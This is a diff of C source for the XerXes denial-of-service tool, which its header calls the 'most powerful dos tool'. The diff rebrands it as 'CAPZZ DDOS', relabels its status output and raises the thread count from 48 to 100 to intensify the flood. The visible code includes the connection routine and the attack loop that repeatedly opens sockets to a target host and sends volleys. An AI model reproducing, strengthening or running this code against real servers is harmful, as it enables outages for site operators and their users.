@@ -1,4 +1,4 @@
-/* XerXes - Most powerful dos tool - THN (http://www.thehackernews.com) */
+/*  - Most powerful dos tool - THN (http://www.thehackernews.com) */
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -15,7 +15,7 @@
 int make_socket(char *host, char *port) {
 	struct addrinfo hints, *servinfo, *p;
 	int sock, r;
-//	fprintf(stderr, "[Connecting -> %s:%s\n", host, port);
+//	fprintf(stderr, "[CONNECTING TO CAPZZ -> %s:%s\n", host, port);
 	memset(&hints, 0, sizeof(hints));
 	hints.ai_family = AF_UNSPEC;
 	hints.ai_socktype = SOCK_STREAM;
@@ -36,12 +36,12 @@ int make_socket(char *host, char *port) {
 	if(p == NULL) {
 		if(servinfo)
 			freeaddrinfo(servinfo);
-		fprintf(stderr, "No connection could be made\n");
+		fprintf(stderr, "No Capzz Detected\n");
 		exit(0);
 	}
 	if(servinfo)
 		freeaddrinfo(servinfo);
-	fprintf(stderr, "[Connected -> %s:%s]\n", host, port);
+	fprintf(stderr, "[CONNECTED TO CAPZZ DDOS -> %s:%s]\n", host, port);
 	return sock;
 }
 
@@ -50,7 +50,7 @@ void broke(int s) {
 }
 
 #define CONNECTIONS 8
-#define THREADS 48
+#define THREADS 100
 
 void attack(char *host, char *port, int id) {
 	int sockets[CONNECTIONS];
@@ -68,9 +68,9 @@ void attack(char *host, char *port, int id) {
 				sockets[x] = make_socket(host, port);
 			} else
 //				fprintf(stderr, "Socket[%i->%i] -> %i\n", x, sockets[x], r);
-			fprintf(stderr, "[%i: Voly Sent]\n", id);
+			fprintf(stderr, "[%i: PACKET SENDED]\n", id);
 		}
-		fprintf(stderr, "[%i: Voly Sent]\n", id);
+		fprintf(stderr, "[%i: PACKET SENDED]\n", id);
 		usleep(300000);
 	}
 }
